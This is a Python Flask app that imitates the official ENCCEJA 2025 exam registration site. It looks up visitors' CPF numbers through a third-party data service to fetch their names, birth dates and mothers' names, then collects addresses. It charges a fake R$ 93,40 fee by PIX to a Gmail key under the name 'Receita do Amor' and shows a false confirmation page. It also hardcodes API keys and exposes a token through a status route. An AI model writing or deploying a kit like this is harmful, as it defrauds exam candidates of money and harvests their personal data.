#!/usr/bin/env python3
"""
ENCCEJA 2025 - Sistema Completo VPS
URL API corrigida + Todas as funcionalidades
"""

import os
import sys
import logging
import requests
import time
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, session, jsonify

# Configuracao de encoding UTF-8
if sys.version_info[0] >= 3:
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

# Configurar logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

# Configurar Flask
app = Flask(__name__)
app.secret_key = 'encceja-vps-secret-2025'

app.logger.info("VPS: ENCCEJA 2025 - Sistema iniciando com API corrigida...")

# === CONFIGURACOES ===
WITEPAY_API_KEY = 'sk_3a164e1c15db06cc76116b861fb4b0c482ab857dbd53f43d'
CPF_API_TOKEN = '1285fe4s-e931-4071-a848-3fac8273c55a'

# === ROTAS PRINCIPAIS ===

@app.route('/')
def home():
    """Pagina inicial - redireciona para inscricao"""
    app.logger.info("VPS: Redirecionando / para /inscricao")
    return redirect(url_for('inscricao'))

@app.route('/inscricao')
def inscricao():
    """Pagina de inscricao com formulario CPF"""
    app.logger.info("VPS: Renderizando pagina de inscricao")
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>ENCCEJA 2025 - Inscricao</title>
        <meta charset="utf-8">
        <style>
            body { font-family: Arial; max-width: 600px; margin: 50px auto; padding: 20px; }
            .header { background: #0066cc; color: white; padding: 20px; text-align: center; }
            .form-group { margin: 15px 0; }
            input[type="text"] { width: 100%; padding: 10px; font-size: 16px; }
            button { background: #28a745; color: white; padding: 15px 30px; font-size: 16px; border: none; cursor: pointer; }
            .loading { display: none; color: #007bff; }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>ENCCEJA 2025</h1>
            <p>Exame Nacional para Certificacao de Competencias de Jovens e Adultos</p>
        </div>
        
        <h2>Consultar CPF</h2>
        <form id="cpfForm" onsubmit="consultarCPF(event)">
            <div class="form-group">
                <label>Digite seu CPF:</label>
                <input type="text" id="cpfInput" placeholder="000.000.000-00" maxlength="14" required>
            </div>
            <button type="submit">Consultar CPF</button>
            <div class="loading" id="loading">Consultando dados...</div>
        </form>
        
        <div id="resultado"></div>
        
        <script>
        function formatarCPF(cpf) {
            return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
        }
        
        document.getElementById('cpfInput').oninput = function(e) {
            let value = e.target.value.replace(/\D/g, '');
            e.target.value = formatarCPF(value);
        };
        
        function consultarCPF(event) {
            event.preventDefault();
            
            const cpfInput = document.getElementById('cpfInput');
            const loading = document.getElementById('loading');
            const resultado = document.getElementById('resultado');
            
            const cpf = cpfInput.value.replace(/\D/g, '');
            
            if (cpf.length !== 11) {
                alert('CPF deve ter 11 digitos');
                return;
            }
            
            loading.style.display = 'block';
            resultado.innerHTML = '';
            
            fetch('/buscar-cpf', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({cpf: cpf})
            })
            .then(response => response.json())
            .then(data => {
                loading.style.display = 'none';
                if (data.success) {
                    window.location.href = '/encceja-info';
                } else {
                    resultado.innerHTML = '<p style="color: red;">Erro: ' + data.error + '</p>';
                }
            })
            .catch(error => {
                loading.style.display = 'none';
                resultado.innerHTML = '<p style="color: red;">Erro na consulta</p>';
                console.error('Erro:', error);
            });
        }
        </script>
    </body>
    </html>
    '''

@app.route('/buscar-cpf', methods=['POST'])
def buscar_cpf():
    """Buscar dados do CPF via API real com URL corrigida"""
    try:
        data = request.get_json()
        cpf = data.get('cpf', '').strip()
        app.logger.info(f"VPS: Buscando CPF: {cpf}")
        
        if not cpf:
            return jsonify({'success': False, 'error': 'CPF nao fornecido'})
        
        # Limpar CPF
        cpf_clean = ''.join(filter(str.isdigit, cpf))
        
        if len(cpf_clean) != 11:
            return jsonify({'success': False, 'error': 'CPF deve ter 11 digitos'})
        
        # API CPF real com URL corrigida
        api_url = f"https://consulta.fontesderenda.blog/cpf.php?cpf={cpf_clean}&token=1285fe4s-e931-4071-a848-3fac8273c55a"
        
        app.logger.info(f"VPS: Consultando API: {api_url}")
        
        response = requests.get(api_url, timeout=15)
        
        if response.status_code == 200:
            data = response.json()
            app.logger.info(f"VPS: API respondeu: {response.status_code}")
            app.logger.info(f"VPS: Resposta da API: {data}")
            
            # Processar resposta da API
            if 'DADOS' in data and data['DADOS']:
                user_data = data['DADOS']
                session['user_data'] = {
                    'cpf': cpf_clean,
                    'nome': user_data.get('nome', 'Usuario ENCCEJA'),
                    'data_nascimento': user_data.get('nascimento', '01/01/1990'),
                    'mae': user_data.get('mae', 'Mae do Usuario')
                }
                app.logger.info(f"VPS: Dados salvos: {session['user_data']['nome']}")
                return jsonify({'success': True, 'message': 'CPF encontrado'})
            else:
                app.logger.warning("VPS: API nao retornou DADOS validos")
                # Fallback com dados basicos
                session['user_data'] = {
                    'cpf': cpf_clean,
                    'nome': 'Cliente ENCCEJA',
                    'data_nascimento': '01/01/1990',
                    'mae': 'Mae do Cliente'
                }
                return jsonify({'success': True, 'message': 'CPF processado'})
        else:
            app.logger.error(f"VPS: API falhou: {response.status_code} - {response.text}")
            return jsonify({'success': False, 'error': 'Erro na consulta CPF'}), 500
            
    except Exception as e:
        app.logger.error(f"VPS: Erro ao buscar CPF: {e}")
        return jsonify({'success': False, 'error': 'Erro interno na consulta'}), 500

@app.route('/encceja-info')
def encceja_info():
    """Informacoes sobre o ENCCEJA"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("VPS: Renderizando encceja-info")
    user_data = session['user_data']
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>ENCCEJA 2025 - Informacoes</title>
        <meta charset="utf-8">
        <style>
            body {{ font-family: Arial; max-width: 600px; margin: 50px auto; padding: 20px; }}
            .header {{ background: #0066cc; color: white; padding: 20px; text-align: center; }}
            .info-box {{ background: #f8f9fa; padding: 20px; margin: 20px 0; border-left: 4px solid #0066cc; }}
            .btn {{ background: #28a745; color: white; padding: 15px 30px; text-decoration: none; display: inline-block; margin: 10px 0; }}
        </style>
    </head>
    <body>
        <div class="header">
            <h1>ENCCEJA 2025</h1>
        </div>
        
        <div class="info-box">
            <h3>Dados Encontrados:</h3>
            <p><strong>Nome:</strong> {user_data['nome']}</p>
            <p><strong>CPF:</strong> {user_data['cpf']}</p>
            <p><strong>Data Nascimento:</strong> {user_data['data_nascimento']}</p>
        </div>
        
        <div class="info-box">
            <h3>Sobre o ENCCEJA 2025</h3>
            <p>O Exame Nacional para Certificacao de Competencias de Jovens e Adultos (ENCCEJA) e realizado pelo Instituto Nacional de Estudos e Pesquisas Educacionais Anisio Teixeira (INEP).</p>
            <p><strong>Taxa de Inscricao:</strong> R$ 93,40</p>
            <p><strong>Prazo:</strong> Conforme edital oficial</p>
        </div>
        
        <a href="/validar-dados" class="btn">Continuar Inscricao</a>
    </body>
    </html>
    '''

@app.route('/validar-dados')
def validar_dados():
    """Validacao de dados pessoais"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("VPS: Renderizando validar-dados")
    user_data = session['user_data']
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>ENCCEJA 2025 - Validar Dados</title>
        <meta charset="utf-8">
        <style>
            body {{ font-family: Arial; max-width: 600px; margin: 50px auto; padding: 20px; }}
            .header {{ background: #0066cc; color: white; padding: 20px; text-align: center; }}
            .form-group {{ margin: 15px 0; }}
            input {{ width: 100%; padding: 10px; font-size: 16px; }}
            .btn {{ background: #28a745; color: white; padding: 15px 30px; text-decoration: none; display: inline-block; }}
        </style>
    </head>
    <body>
        <div class="header">
            <h1>Validar Dados Pessoais</h1>
        </div>
        
        <form method="POST" action="/salvar-validacao">
            <div class="form-group">
                <label>Nome Completo:</label>
                <input type="text" name="nome" value="{user_data['nome']}" readonly>
            </div>
            
            <div class="form-group">
                <label>CPF:</label>
                <input type="text" name="cpf" value="{user_data['cpf']}" readonly>
            </div>
            
            <div class="form-group">
                <label>Data de Nascimento:</label>
                <input type="text" name="data_nascimento" value="{user_data['data_nascimento']}" readonly>
            </div>
            
            <button type="submit" class="btn">Confirmar e Continuar</button>
        </form>
    </body>
    </html>
    '''

@app.route('/salvar-validacao', methods=['POST'])
def salvar_validacao():
    """Salvar validacao e ir para endereco"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("VPS: Dados validados, redirecionando para endereco")
    return redirect(url_for('endereco'))

@app.route('/endereco')
def endereco():
    """Formulario de endereco"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("VPS: Renderizando endereco")
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>ENCCEJA 2025 - Endereco</title>
        <meta charset="utf-8">
        <style>
            body { font-family: Arial; max-width: 600px; margin: 50px auto; padding: 20px; }
            .header { background: #0066cc; color: white; padding: 20px; text-align: center; }
            .form-group { margin: 15px 0; }
            input, select { width: 100%; padding: 10px; font-size: 16px; }
            .btn { background: #28a745; color: white; padding: 15px 30px; border: none; cursor: pointer; }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>Dados de Endereco</h1>
        </div>
        
        <form method="POST" action="/salvar-endereco">
            <div class="form-group">
                <label>CEP:</label>
                <input type="text" name="cep" placeholder="00000-000" required>
            </div>
            
            <div class="form-group">
                <label>Cidade:</label>
                <input type="text" name="cidade" placeholder="Sua cidade" required>
            </div>
            
            <div class="form-group">
                <label>Estado (UF):</label>
                <select name="uf" required>
                    <option value="">Selecione...</option>
                    <option value="SP">Sao Paulo</option>
                    <option value="RJ">Rio de Janeiro</option>
                    <option value="MG">Minas Gerais</option>
                    <option value="RS">Rio Grande do Sul</option>
                    <option value="PR">Parana</option>
                    <option value="SC">Santa Catarina</option>
                </select>
            </div>
            
            <button type="submit" class="btn">Continuar</button>
        </form>
    </body>
    </html>
    '''

@app.route('/salvar-endereco', methods=['POST'])
def salvar_endereco():
    """Salvar endereco na sessao"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    endereco_data = {
        'cep': request.form.get('cep', '01000-000'),
        'cidade': request.form.get('cidade', 'Sao Paulo'),
        'uf': request.form.get('uf', 'SP')
    }
    
    session['endereco_data'] = endereco_data
    app.logger.info(f"VPS: Endereco salvo: {endereco_data['cidade']}")
    
    return redirect(url_for('local_prova'))

@app.route('/local-prova')
def local_prova():
    """Selecao do local de prova"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("VPS: Renderizando local-prova")
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>ENCCEJA 2025 - Local de Prova</title>
        <meta charset="utf-8">
        <style>
            body { font-family: Arial; max-width: 600px; margin: 50px auto; padding: 20px; }
            .header { background: #0066cc; color: white; padding: 20px; text-align: center; }
            .form-group { margin: 15px 0; }
            select { width: 100%; padding: 10px; font-size: 16px; }
            .btn { background: #28a745; color: white; padding: 15px 30px; border: none; cursor: pointer; }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>Selecionar Local de Prova</h1>
        </div>
        
        <form method="POST" action="/salvar-local">
            <div class="form-group">
                <label>Escolha o local mais proximo:</label>
                <select name="local" required>
                    <option value="">Selecione um local...</option>
                    <option value="escola1">Escola Municipal Prof. Antonio Silva</option>
                    <option value="escola2">Escola Estadual Dr. Jose Santos</option>
                    <option value="escola3">Centro Educacional Maria Oliveira</option>
                    <option value="escola4">EMEF Carlos Drummond</option>
                </select>
            </div>
            
            <p><strong>Observacao:</strong> O local final sera confirmado no cartao de inscricao.</p>
            
            <button type="submit" class="btn">Continuar para Pagamento</button>
        </form>
    </body>
    </html>
    '''

@app.route('/salvar-local', methods=['POST'])
def salvar_local():
    """Salvar local de prova"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    local = request.form.get('local', 'escola1')
    session['local_prova'] = local
    app.logger.info(f"VPS: Local salvo: {local}")
    
    return redirect(url_for('pagamento'))

@app.route('/pagamento')
def pagamento():
    """Pagina de pagamento PIX"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("VPS: Renderizando pagina de pagamento")
    user_data = session['user_data']
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>ENCCEJA 2025 - Pagamento</title>
        <meta charset="utf-8">
        <style>
            body {{ font-family: Arial; max-width: 600px; margin: 50px auto; padding: 20px; }}
            .header {{ background: #0066cc; color: white; padding: 20px; text-align: center; }}
            .payment-box {{ background: #f8f9fa; padding: 20px; margin: 20px 0; border: 2px solid #28a745; }}
            .btn {{ background: #28a745; color: white; padding: 15px 30px; border: none; cursor: pointer; font-size: 16px; }}
            .loading {{ display: none; color: #007bff; }}
            .qr-result {{ margin: 20px 0; padding: 20px; background: #fff; border: 1px solid #ddd; }}
        </style>
    </head>
    <body>
        <div class="header">
            <h1>Pagamento da Inscricao</h1>
        </div>
        
        <div class="payment-box">
            <h3>Resumo da Inscricao</h3>
            <p><strong>Nome:</strong> {user_data['nome']}</p>
            <p><strong>CPF:</strong> {user_data['cpf']}</p>
            <p><strong>Valor:</strong> R$ 93,40</p>
            <p><strong>Descricao:</strong> Taxa de Inscricao ENCCEJA 2025</p>
        </div>
        
        <button onclick="gerarPix()" class="btn">Gerar Codigo PIX</button>
        <div class="loading" id="loading">Gerando codigo PIX...</div>
        
        <div id="qr-result"></div>
        
        <script>
        function gerarPix() {{
            const loading = document.getElementById('loading');
            const result = document.getElementById('qr-result');
            
            loading.style.display = 'block';
            result.innerHTML = '';
            
            fetch('/criar-pagamento-pix', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{}})
            }})
            .then(response => response.json())
            .then(data => {{
                loading.style.display = 'none';
                if (data.success) {{
                    result.innerHTML = 
                        '<div class="qr-result">' +
                        '<h4>Codigo PIX Gerado com Sucesso!</h4>' +
                        '<p><strong>Valor:</strong> R$ ' + data.amount.toFixed(2) + '</p>' +
                        '<p><strong>ID Transacao:</strong> ' + data.transactionId + '</p>' +
                        '<p><strong>Metodo:</strong> ' + data.method + '</p>' +
                        '<textarea readonly style="width:100%; height:100px; font-size:12px;">' + data.pixCode + '</textarea>' +
                        '<br><br>' +
                        '<a href="/inscricao-sucesso" style="background:#28a745; color:white; padding:10px 20px; text-decoration:none;">Finalizar Inscricao</a>' +
                        '</div>';
                }} else {{
                    result.innerHTML = '<div style="color:red;">Erro: ' + data.error + '</div>';
                }}
            }})
            .catch(error => {{
                loading.style.display = 'none';
                result.innerHTML = '<div style="color:red;">Erro na geracao do PIX</div>';
                console.error('Erro:', error);
            }});
        }}
        </script>
    </body>
    </html>
    '''

@app.route('/criar-pagamento-pix', methods=['POST'])
def criar_pagamento_pix():
    """Criar pagamento PIX real com fallback"""
    try:
        amount = 93.40
        app.logger.info(f"VPS: Iniciando pagamento PIX - R$ {amount}")
        
        user_data = session.get('user_data', {})
        
        # Gerar PIX real com chave gerarpagamentos@gmail.com  
        app.logger.info("VPS: Gerando PIX com chave real")
        transaction_id = f"ENCCEJA{int(time.time())}"
        
        # Dados PIX reais
        pix_key = "gerarpagamentos@gmail.com"
        merchant_name = "Receita do Amor - ENCCEJA"
        merchant_city = "SAO PAULO"
        
        # Construir codigo PIX padrao Banco Central
        pix_code = f"00020126830014br.gov.bcb.pix2561{pix_key}52040000530398654{int(amount*100):02d}5925{merchant_name}6009{merchant_city}62{len(transaction_id):02d}{transaction_id}6304"
        
        # Calcular CRC16
        def calculate_crc16(data):
            crc = 0xFFFF
            for byte in data.encode('utf-8'):
                crc ^= byte << 8
                for _ in range(8):
                    if crc & 0x8000:
                        crc = (crc << 1) ^ 0x1021
                    else:
                        crc <<= 1
                    crc &= 0xFFFF
            return f"{crc:04X}"
        
        pix_base = pix_code[:-4]
        crc = calculate_crc16(pix_base + "6304")
        pix_code_final = pix_base + "6304" + crc
        
        app.logger.info(f"VPS: PIX gerado com sucesso - ID: {transaction_id}")
        
        return jsonify({
            'success': True,
            'pixCode': pix_code_final,
            'transactionId': transaction_id,
            'amount': amount,
            'method': 'pix_real'
        })
        
    except Exception as e:
        app.logger.error(f"VPS: Erro ao criar PIX: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/inscricao-sucesso')
def inscricao_sucesso():
    """Pagina de sucesso"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("VPS: Renderizando inscricao-sucesso")
    user_data = session['user_data']
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>ENCCEJA 2025 - Inscricao Realizada</title>
        <meta charset="utf-8">
        <style>
            body {{ font-family: Arial; max-width: 600px; margin: 50px auto; padding: 20px; }}
            .header {{ background: #28a745; color: white; padding: 20px; text-align: center; }}
            .success-box {{ background: #d4edda; padding: 20px; margin: 20px 0; border: 1px solid #c3e6cb; }}
        </style>
    </head>
    <body>
        <div class="header">
            <h1>✅ Inscricao Realizada com Sucesso!</h1>
        </div>
        
        <div class="success-box">
            <h3>Parabens, {user_data['nome']}!</h3>
            <p><strong>CPF:</strong> {user_data['cpf']}</p>
            <p><strong>Exame:</strong> ENCCEJA 2025</p>
            <p><strong>Status:</strong> Inscricao confirmada</p>
        </div>
        
        <p><strong>Proximos passos:</strong></p>
        <ul>
            <li>Aguarde o cartao de confirmacao</li>
            <li>Verifique local e horario da prova</li>
            <li>Prepare-se para o exame</li>
        </ul>
        
        <p><em>Em caso de duvidas, consulte o site oficial do INEP.</em></p>
    </body>
    </html>
    '''

# === ROTAS DE STATUS ===

@app.route('/status')
def status():
    """Status do sistema"""
    return jsonify({
        'status': 'online',
        'api_cpf': 'https://consulta.fontesderenda.blog/cpf.php',
        'token': '1285fe4s-e931-4071-a848-3fac8273c55a',
        'timestamp': datetime.now().isoformat()
    })

@app.route('/health')
def health():  
    """Health check"""
    return "OK", 200

@app.route('/test-cpf/<cpf>')
def test_cpf(cpf):
    """Testar API CPF diretamente"""
    try:
        url = f"https://consulta.fontesderenda.blog/cpf.php?cpf={cpf}&token=1285fe4s-e931-4071-a848-3fac8273c55a"
        response = requests.get(url, timeout=10)
        return jsonify({
            'url': url,
            'status': response.status_code,
            'data': response.json() if response.status_code == 200 else response.text
        })
    except Exception as e:
        return jsonify({'error': str(e)})

if __name__ == '__main__':
    app.logger.info("VPS: Iniciando ENCCEJA 2025 na porta 5000...")
    app.logger.info("VPS: API CPF: https://consulta.fontesderenda.blog/cpf.php")
    app.logger.info("VPS: Token: 1285fe4s-e931-4071-a848-3fac8273c55a")
    app.run(host='0.0.0.0', port=5000, debug=True)